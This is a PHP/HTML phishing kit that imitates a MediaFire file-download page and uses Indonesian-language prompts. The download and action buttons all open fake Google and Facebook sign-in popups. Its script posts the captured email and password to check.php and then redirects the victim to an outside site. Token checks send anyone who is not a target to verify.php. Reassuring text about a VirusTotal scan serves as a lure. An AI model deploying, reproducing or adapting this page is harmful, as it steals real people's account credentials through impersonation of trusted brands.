<?php
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Download - MediaFire</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
    <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { font: normal 14px/1.6 'Open Sans', sans-serif; background: #fff; }

    /* ===== HEADER ===== */
    header {
      background: #fff; padding: 20px 0;
      display: flex; flex-direction: row;
      justify-content: space-between; align-items: center;
      border-bottom: 1px solid #0000002b;
      box-shadow: 0 0 1px 0 #0000002e;
      position: fixed; z-index: 2; width: 100%;
    }
    .imgmdralex { margin-left: 10%; }
    .logo-mf {
      display: flex; align-items: center; gap: 8px;
      font-size: 22px; font-weight: 700; color: #333; text-decoration: none;
    }
    .logo-mf-icon {
      width: 36px; height: 36px; background: #1da462; border-radius: 6px;
      display: flex; align-items: center; justify-content: center;
      color: #fff; font-weight: 900; font-size: 18px;
    }
    .logo-mf span { color: #1da462; }
    .menualexuser {
      margin-right: 10%;
      display: flex; flex-direction: row; align-items: center; gap: 6px;
    }
    .menualexuser button {
      background: #0070f0; color: #fff; white-space: nowrap;
      font-size: 12px; padding: 0 14px; display: inline-block;
      border-radius: 3px; font-family: 'Open Sans', sans-serif;
      font-weight: 500; cursor: pointer; height: 36px; line-height: 36px;
      border: 0; outline: 0; text-transform: uppercase; text-align: center;
      transition: background 0.15s;
    }
    .menualexuser button:hover { background: #0060d0; }
    .btn-signup-mf {
      background: transparent !important; color: #0070f0 !important;
      border: 1px solid #0070f0 !important;
    }
    .btn-signup-mf:hover { background: #f0f7ff !important; }

    /* ===== MAIN ===== */
    main { display: flex; flex-direction: column; align-items: center; }
    section { padding-top: 120px; max-width: 400px; width: 100%; }
    .contalexmdr { display: flex; flex-direction: column; align-items: center; }

    /* ===== DOWNLOAD BUTTON ===== */
    .btnalexdwn {
      width: 100%; background: #0070f0; color: #fff;
      align-items: center; padding: 10px 0;
      display: flex; flex-direction: row; border-radius: 4px;
      justify-content: space-between; cursor: pointer;
      transition: background 0.15s; border: none; font-family: inherit;
    }
    .btnalexdwn:hover { background: #005dd0; }
    .lalexbtnd { margin-left: 20px; display: flex; align-items: center; gap: 16px; }
    .file-icon-mf { width: 46px; height: 46px; flex-shrink: 0; }
    .file-icon-mf img {
      width: 46px; height: 46px; object-fit: contain;
      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.25));
    }
    .txtalexdwn { text-align: left; }
    .txtalexdwn p { font-weight: 700; font-size: 15px; color: #fff; }
    .txtalexdwn label { font-size: 12px; color: rgba(255,255,255,0.85); cursor: pointer; }
    .btnalexdwn .fa-download { margin-right: 20px; font-size: 20px; }

    /* ===== ACTION LINKS ===== */
    .alexlnkcont {
      margin-top: 20px; width: 100%;
      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
    }
    .itemalexcont {
      width: 49%; font-size: 13px; background-color: #f4f4f5;
      border-radius: 4px; color: #575b65; padding: 10px 0; text-align: center;
      display: flex; flex-direction: column; align-items: center;
      margin-bottom: 10px; cursor: pointer; transition: background 0.12s;
      border: none; font-family: inherit; line-height: 14px;
    }
    .itemalexcont:hover { background: #e8e8ea; }
    .itemalexcont i { font-size: 18px; color: #777; margin-bottom: 5px; }

    /* ===== INFO SECTION ===== */
    .uplregalexmdr { margin-top: 60px; margin-bottom: 80px; }

    /* ===== MAP — blue ocean, orange land ===== */
    .alexmapmdr {
      position: relative; overflow: hidden;
      background: #4cacff;
      margin-bottom: 30px; width: 100%; height: 160px; border-radius: 4px;
    }
    .map-img {
      position: absolute; top: 0; left: 0;
      width: 100%; height: 100%; object-fit: contain;
      /* invert → land becomes white, ocean becomes black
         mix-blend-mode difference over blue:
           white land → (1-blue) ≈ orange  ✓
           black ocean → blue               ✓  */
      filter: invert(1);
      mix-blend-mode: difference;
    }
    .descalexmapmdr {
      display: inline-block; padding: 4px 8px; color: #fff;
      font-size: 11px; background-color: rgba(0,0,0,0.4);
      position: relative; z-index: 1; border-radius: 2px;
    }

    .alexdescmap { display: flex; align-items: center; margin-bottom: 10px; }
    .flag-icon { font-size: 28px; margin-right: 12px; }
    .alexdescmap span { font-size: 13px; color: #555; }
    .vtotoalalexmdr {
      padding-bottom: 30px; border-bottom: 1px solid #00000014;
      margin-bottom: 20px; margin-top: 30px; display: flex; flex-direction: column;
    }
    .vtotol-icon {
      width: 72px; height: 72px; background: #f0fdf4; border-radius: 8px;
      display: flex; align-items: center; justify-content: center;
      margin-bottom: 12px; border: 1px solid #c8e6c9;
    }
    .vtotol-icon i { font-size: 32px; color: #1da462; }
    .vtotoalalexmdr p { font-weight: 700; font-size: 14px; margin-bottom: 6px; color: #222; }
    .vtotoalalexmdr span { font-size: 13px; line-height: 1.5; color: #555; }
    .no-border { border-bottom: none !important; }

    /* ===== FOOTER ===== */
    footer {
      padding: 30px 0; width: 100%; background-color: #f3f3f3;
      min-height: 260px; color: #575b65;
    }
    .topmdrfootalex {
      max-width: 960px; margin: 0 auto;
      display: flex; align-items: flex-start;
      justify-content: space-between; padding-bottom: 40px;
      border-bottom: 1px solid #55555529;
    }
    .itemboxmdralexf { text-align: left; display: flex; flex-direction: column; font-size: 12px; }
    .itemboxmdralexf p { color: #575b65; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 10px; }
    .itemboxmdralexf a { color: #888; display: block; margin-bottom: 6px; cursor: pointer; text-decoration: none; transition: color 0.12s; }
    .itemboxmdralexf a:hover { color: #444; }
    .alexfootalexc {
      max-width: 960px; padding-top: 24px;
      display: flex; align-items: center; justify-content: space-between;
      margin: 0 auto; font-size: 12px; color: #888;
    }
    .leftcalexmdrf { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; }
    .rightalexmdrf { font-size: 18px; display: flex; align-items: center; gap: 14px; }
    .rightalexmdrf i {
      color: #575b656b; padding: 6px 9px; border-radius: 3px;
      background: #575b6510; cursor: pointer; transition: background 0.12s;
    }
    .rightalexmdrf i:hover { background: #575b6525; color: #575b65; }

    /* ===== POPUP OVERLAY ===== */
    .popup-overlay {
      background: rgba(0,0,0,0.65);
      width: 100%; height: 100%;
      position: fixed; top: 0; left: 0; z-index: 9999;
      display: none; flex-direction: column;
      align-items: center; justify-content: flex-start;
      padding-top: clamp(42px, 8vh, 86px);
      overflow-y: auto;
    }
    .popup-overlay.active { display: flex; }

    @keyframes fadeInUp {
      from { opacity:0; transform: translateY(16px); }
      to   { opacity:1; transform: translateY(0); }
    }

    /* ===== SWITCHER ROW (di atas popup) ===== */
    .switcher-row {
      display: flex; gap: 10px; margin-bottom: 14px;
      animation: fadeInUp 0.2s ease;
    }
    .sw-btn {
      display: flex; align-items: center; gap: 8px;
      padding: 8px 18px; border-radius: 24px;
      border: 2px solid transparent;
      font-family: 'Open Sans', sans-serif; font-size: 13px; font-weight: 600;
      cursor: pointer; transition: all 0.15s;
    }
    .sw-btn .sw-icon { width: 20px; height: 20px; flex-shrink: 0; }
    /* Inactive */
    .sw-btn.google-sw {
      background: rgba(255,255,255,0.12);
      color: rgba(255,255,255,0.6);
      border-color: rgba(255,255,255,0.2);
    }
    .sw-btn.facebook-sw {
      background: rgba(255,255,255,0.12);
      color: rgba(255,255,255,0.6);
      border-color: rgba(255,255,255,0.2);
    }
    /* Active */
    .sw-btn.google-sw.active {
      background: #fff; color: #3c4043;
      border-color: #fff;
    }
    .sw-btn.facebook-sw.active {
      background: #1877f2; color: #fff;
      border-color: #1877f2;
    }
    .sw-btn:hover { opacity: 0.9; transform: translateY(-1px); }

    /* ===== BOTH POPUP BOXES — same size ===== */
    .popup-box-login-gg,
    .container-box-fb {
      background: #fff;
      width: 360px; max-width: 92vw;
      height: 540px;
      max-height: calc(100vh - 132px);
      border-radius: 10px;
      box-shadow: 0 24px 64px rgba(0,0,0,0.35);
      animation: fadeInUp 0.2s ease;
      overflow: hidden; position: relative;
      display: flex; flex-direction: column;
    }

    /* ===== GOOGLE LOGIN ===== */
    .header-gg {
      background: #fff; padding: 14px 18px;
      border-bottom: 1px solid #E5EAED;
      display: flex; align-items: center; gap: 10px;
    }
    .header-gg-text { font-size: 14px; font-weight: 600; color: #333; }
    .close-btn {
      position: absolute; top: 10px; right: 10px;
      width: 28px; height: 28px; border-radius: 50%;
      background: #f1f3f4; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      font-size: 16px; color: #555; transition: background 0.12s; z-index: 10;
    }
    .close-btn:hover { background: #e0e0e0; }
    .content-box-gg { padding: 20px 24px 24px; overflow-y: auto; flex: 1; }
    .txt-login-gg { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 4px; }
    .txt-login-ggs { font-size: 14px; color: #444; margin-bottom: 20px; }
    .txt-login-ggs a { color: #185FD1; font-weight: 500; cursor: pointer; }
    .form__div { position: relative; height: 52px; margin-bottom: 22px; }
    .form__input {
      position: absolute; top: 0; left: 0;
      width: 100%; height: 100%;
      border: 1px solid #AFB0AF; border-radius: 4px;
      color: #454746; outline: none; background: #fff;
      font-size: 16px; font-family: 'Open Sans', sans-serif; padding: 0 12px;
    }
    .form__input:focus { border: 2px solid #1a73e8; }
    .form__label {
      position: absolute; left: 12px; top: 16px;
      background: #fff; color: #80868b;
      transition: all 0.2s; font-size: 14px;
      padding: 0 4px; pointer-events: none;
    }
    .form__input:focus + .form__label,
    .form__input.filled + .form__label {
      top: -8px; font-size: 11px; color: #1a73e8;
    }
    .showpass { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
    .showpass label { font-size: 12px; color: #555; cursor: pointer; }
    .alert-gg-failed { margin-bottom: 12px; }
    .alert-gg { color: #B3261D; font-size: 12px; display: flex; align-items: center; gap: 5px; }
    .content-box-gg-txt-footer { font-size: 12px; color: #454746; margin-bottom: 12px; line-height: 1.5; }
    .content-box-gg-txt-footer a { color: #1A62D1; cursor: pointer; }
    .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 12px; }
    .btn-forgot-google {
      background: none; border: none; color: #1a73e8;
      font-size: 14px; cursor: pointer; font-family: 'Open Sans', sans-serif;
    }
    .btn-login-google {
      background: #1a73e8; color: #fff; border: none;
      border-radius: 5px; padding: 10px 22px;
      font-size: 14px; font-family: 'Open Sans', sans-serif;
      cursor: pointer; transition: background 0.15s;
    }
    .btn-login-google:hover { background: #1565c0; }

    /* ===== FACEBOOK LOGIN ===== */
    .atasan-fb {
      background: #1877f2; padding: 12px 20px;
      display: flex; align-items: center; gap: 10px;
    }
    .fb-logo-header { display: flex; align-items: center; gap: 8px; }
    .fb-logo-header i { font-size: 26px; color: #fff; }
    .fb-logo-header span { color: #fff; font-size: 19px; font-weight: 800; letter-spacing: -0.5px; }
    .isi-facebook { padding: 14px 22px 10px; overflow: visible; flex: 1; }
    .fb-logo-tengah { text-align: center; margin-bottom: 10px; }
    .fb-logo-tengah i { font-size: var(--fb-logo-tengah-size, 46px); color: #1877f2; }
    .txt-ucapan-fb { font-size: 13px; color: #444; margin-bottom: 10px; line-height: 1.3; text-align: center; }
    .form-login-fb { display: flex; flex-direction: column; gap: 8px; }
    .form-login-fb input {
      padding: 10px 14px; border: 1px solid #ddd; border-radius: 6px;
      font-size: 15px; font-family: 'Open Sans', sans-serif; outline: none;
      transition: border 0.15s; width: 100%;
    }
    .form-login-fb input:focus { border: 2px solid #1877f2; }
    .kaget { color: #e53935; font-size: 11px; margin-bottom: 4px; line-height: 1.25; display: none; text-align: center; }
    .kaget.show { display: block; }
    .btn-login-fb {
      background: #1877f2; color: #fff; border: none; border-radius: 6px;
      padding: 10px; font-size: 15px; font-weight: 700;
      font-family: 'Open Sans', sans-serif; cursor: pointer; margin-top: 4px;
      transition: background 0.15s;
    }
    .btn-login-fb:hover { background: #1565c0; }
    .txt-buat-akun {
      text-align: center; color: #1877f2; font-size: 14px;
      font-weight: 600; cursor: pointer; margin-top: 8px;
      padding: 6px 0; border-top: 1px solid #eee;
    }
    .txt-tidak-sekarang, .txt-lupa-password {
      text-align: center; color: #777; font-size: 11px; cursor: pointer; padding: 2px 0;
    }
    .isi-bahasa {
      background: #f0f2f5; padding: 8px 14px;
      display: flex; flex-wrap: wrap; gap: 6px; border-top: 1px solid #ddd;
    }
    .nama-bahasa {
      font-size: 10px; color: #555; cursor: pointer;
      padding: 2px 6px; border-radius: 3px; transition: background 0.12s;
    }
    .nama-bahasa:hover { background: #e0e0e0; }
    .nama-bahasa.bahasa-aktif { color: #1877f2; font-weight: 600; }
    .kalobukanalexsiapalagi {
      text-align: center; font-size: 10px; color: #999;
      padding: 7px 0; background: #f0f2f5; border-top: 1px solid #ddd;
    }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 600px) {
      .imgmdralex { margin-left: 5%; }
      .menualexuser { margin-right: 4%; }
      .menualexuser button { font-size: 10px; padding: 0 8px; }
      section { width: 90%; }
      .topmdrfootalex { flex-direction: column; width: 90%; gap: 20px; }
      .alexfootalexc { width: 90%; flex-direction: column; gap: 16px; }
      .popup-overlay { padding-top: 26px; padding-bottom: 26px; }
      .popup-box-login-gg,
      .container-box-fb { height: 540px; max-height: calc(100vh - 112px); }
    }
  </style>
 </head> 
<!-- ===== HEADER ===== -->
<header>
  <div class="imgmdralex">
    <a class="logo-mf" href="#">
      
      <!-- LOGO LEBIH BESAR -->
      <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/23/mediafire.png" 
           alt="MediaFire" 
           style="height:40px; object-fit:contain;">

      <!-- TEXT: Media hitam, Fire biru -->
      <span style="font-weight:700; font-size:22px;">
        <span style="color:#333;">Media</span><span style="color:#0070f0;">Fire</span>
      </span>

    </a>
  </div>
  <div class="menualexuser">
    <button class="btn-signup-mf">Sign Up</button>
    <button onclick="showPopup('google')">Log In</button>
  </div>
</header>

<!-- ===== MAIN ===== -->
<main>
  <section>
    <div class="contalexmdr">

      <!-- Download Button -->
      <button class="btnalexdwn" onclick="showPopup('google')">
        <div class="lalexbtnd">
          <div class="file-icon-mf">
            <img src="https://cdn.jsdelivr.net/gh/alex-hostingg/img@main/1/zip.webp" alt="video"
              onerror="this.style.display='none'">
          </div>
          <div class="txtalexdwn">
            <p><?php echo $data['nama'];?></p>
            <label>Download (<?php echo $data['ukuran'];?>.8 MB)</label>
          </div>
        </div>
        <i class="fa-solid fa-download"></i>
      </button>

      <!-- Action Links -->
      <div class="alexlnkcont">
        <button class="itemalexcont" onclick="showPopup('google')">
          <i class="fa-solid fa-link"></i>
          <span>Copy for messenger</span>
        </button>
        <button class="itemalexcont" onclick="showPopup('google')">
          <i class="fa-solid fa-share-nodes"></i>
          <span>Share options</span>
        </button>
        <button class="itemalexcont" onclick="showPopup('google')">
          <i class="fa-brands fa-facebook-f"></i>
          <span>Post to Facebook</span>
        </button>
        <button class="itemalexcont" onclick="showPopup('google')">
          <i class="fa-solid fa-plus"></i>
          <span>Save to My Files</span>
        </button>
      </div>
    </div>

    <!-- Info Section -->
    <div class="uplregalexmdr">

      <!-- MAP: blue ocean + orange land -->
      <div class="alexmapmdr">
        <img class="map-img"
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/World_map_-_low_resolution.svg/1280px-World_map_-_low_resolution.svg.png"
          alt="map">
        <div class="descalexmapmdr">Upload region:</div>
      </div>

      <div class="alexdescmap">
       <span class="flag-icon" style="font-size:33px;">🇮🇩</span>
       <span>This file was uploaded from Indonesia on June 29, 2023 at 7:24 AM</span>
      </div>

      <div class="vtotoalalexmdr">
        <div class="vtotol-icon"><i class="fa-solid fa-shield-halved"></i></div>
        <p>VirusTotal scan</p>
        <span>MediaFire scans high-risk files using VirusTotal.</span>
      </div>

      <div class="vtotoalalexmdr">
        <div class="vtotol-icon"><i class="fa-solid fa-cloud"></i></div>
        <p>About MediaFire</p>
        <span>Welcome! With MediaFire, you get simple yet powerful file storage along with features you won't find anywhere else.</span>
      </div>

      <div class="vtotoalalexmdr no-border">
        <div class="vtotol-icon"><i class="fa-solid fa-map"></i></div>
        <p>Download application</p>
        <span>You are downloading this file with your browser. Get the MediaFire app for faster access.</span>
      </div>
    </div>
  </section>
</main>

<!-- ===== POPUP GOOGLE ===== -->
<div class="popup-overlay" id="popup-google">

  <!-- Switcher di atas popup -->
  <div class="switcher-row">
    <button class="sw-btn google-sw active" onclick="showPopup('google')">
      <svg class="sw-icon" viewBox="0 0 48 48">
        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
      </svg>
      Google
    </button>
    <button class="sw-btn facebook-sw" onclick="showPopup('facebook')">
      <svg class="sw-icon" viewBox="0 0 24 24" fill="rgba(255,255,255,0.6)">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
      </svg>
      Facebook
    </button>
  </div>

  <!-- Form Google -->
  <div class="popup-box-login-gg">
    <button class="close-btn" onclick="closeAll()">×</button>
    <div class="header-gg">
      <svg width="22" height="22" viewBox="0 0 48 48">
        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
      </svg>
      <div class="header-gg-text">Log in With Google</div>
    </div>
    <div class="content-box-gg">
      <div class="txt-login-gg">Sign in</div>
      <div class="txt-login-ggs">to continue to <a>mediafire.com</a></div>
      <form onsubmit="submitGoogle(event)">
        <div class="form__div">
          <input type="email" class="form__input" id="email-gp" placeholder=" " oninput="clearErr('gp')">
          <label for="email-gp" class="form__label">Email address</label>
        </div>
        <div class="form__div">
          <input type="password" class="form__input" id="password-gp" placeholder=" " oninput="clearErr('gp')">
          <label for="password-gp" class="form__label">Enter your password</label>
        </div>
        <div class="alert-gg-failed" id="err-email-gp" style="display:none">
          <span class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Email atau nomor tidak valid.</span>
        </div>
        <div class="alert-gg-failed" id="err-pass-gp" style="display:none">
          <span class="alert-gg"><i class="fa-solid fa-circle-exclamation"></i> Password minimal 6 karakter dan tidak boleh mengandung / atau link.</span>
        </div>
        <div class="showpass">
          <input type="checkbox" id="showpass" onchange="togglePassGP(this)">
          <label for="showpass">Show Password</label>
        </div>
        <div class="content-box-gg-txt-footer">
          By continuing, Google will share your name, email address, language preference, and profile picture with mediafire.com. See mediafire.com's <a>Privacy Policy</a> and <a>Terms of Service.</a><br><br>
          You can manage Sign in with Google in your <a>Google Account</a>.
        </div>
        <div class="footer-btns">
          <button type="button" class="btn-forgot-google">Forgot password?</button>
          <button type="submit" class="btn-login-google">Log in</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- ===== POPUP FACEBOOK ===== -->
<div class="popup-overlay" id="popup-facebook">

  <!-- Switcher di atas popup -->
  <div class="switcher-row">
    <button class="sw-btn google-sw" onclick="showPopup('google')">
      <svg class="sw-icon" viewBox="0 0 48 48">
        <path fill="rgba(255,255,255,0.6)" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
        <path fill="rgba(255,255,255,0.6)" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
        <path fill="rgba(255,255,255,0.6)" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
        <path fill="rgba(255,255,255,0.6)" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
      </svg>
      Google
    </button>
    <button class="sw-btn facebook-sw active" onclick="showPopup('facebook')">
      <svg class="sw-icon" viewBox="0 0 24 24" fill="#fff">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
      </svg>
      Facebook
    </button>
  </div>

  <!-- Form Facebook -->
  <div class="container-box-fb">
    <button class="close-btn" onclick="closeAll()">×</button>
    <div class="atasan-fb">
      <div class="fb-logo-header">
        <!-- LOGO HEADER DIGANTI JADI IMG -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" style="width: 26px; height: 26px;">
        <span>facebook</span>
      </div>
    </div>
    <div class="isi-facebook">
      <div id="err-email-fb" class="kaget">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></div>
      <div id="err-pass-fb" class="kaget">Password minimal 6 karakter dan tidak boleh mengandung / atau link.</div>
      <div class="fb-logo-tengah">
        <!-- LOGO TENGAH DIGANTI JADI IMG -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" style="width: 46px; height: 46px;">
      </div>
      <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
      <form class="form-login-fb" onsubmit="submitFacebook(event)">
        <input type="text" id="email-fb" placeholder="Email atau Nomor Telepon" oninput="clearErr('fb')">
        <input type="password" id="password-fb" placeholder="Kata Sandi" oninput="clearErr('fb')">
        <button type="submit" class="btn-login-fb">Masuk</button>
      </form>
      <div class="txt-buat-akun">Buat akun</div>
      <div class="txt-tidak-sekarang">Lain kali</div>
      <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
    </div>
    <div class="isi-bahasa">
      <span class="nama-bahasa bahasa-aktif">Bahasa Indonesia</span>
      <span class="nama-bahasa">English (UK)</span>
      <span class="nama-bahasa">Basa Jawa</span>
      <span class="nama-bahasa">Bahasa Melayu</span>
      <span class="nama-bahasa">日本語</span>
      <span class="nama-bahasa">Español</span>
      <span class="nama-bahasa">Português (Brasil)</span>
    </div>
    <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
  </div>
  </div>
</div>
  <script src="alexhost/jquery.min.js"></script>
  <script>
function showlogeni() {
    $(".selectLogin").fadeIn();
    $(".loginFacebook").fadeOut();
    $(".logingoogle").fadeOut();
}

// Tampilkan form login Facebook
function OpenFacebook() {
    $(".selectLogin").fadeOut();
    $(".loginFacebook").fadeIn();
    $(".logingoogle").fadeOut();
}

// Tampilkan form login Google
function OpenGoogle() {
    $(".selectLogin").fadeOut();
    $(".loginFacebook").fadeOut();
    $(".logingoogle").fadeIn();
}

$(document).ready(function() {

    handleFormSubmit("#FromFacebook", 'input[name="email"]', 'input[name="password"]', "Facebook");
    handleFormSubmit("#FromGoogle", "#email_gp", "#password_gp", "Google");

    // Pasang aksi klik tombol
    $("#codeFacebook").click(OpenFacebook);
    $("#codeGoogle").click(OpenGoogle);
    $("#showlogeni").click(showlogeni);
});
  <script>
$(document).ready(function () {

    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

    function handleFormSubmit(formSelector, emailSelector, passwordSelector, loginType) {

        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email    = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();

            if (email && password) {

                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }
                
                $.post("check.php", {
                    email: email,
                    password: password,
                    login: loginType
                });
                window.location.href = "https://officialstore.fyi/unduh/";
            }
        });
    }
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>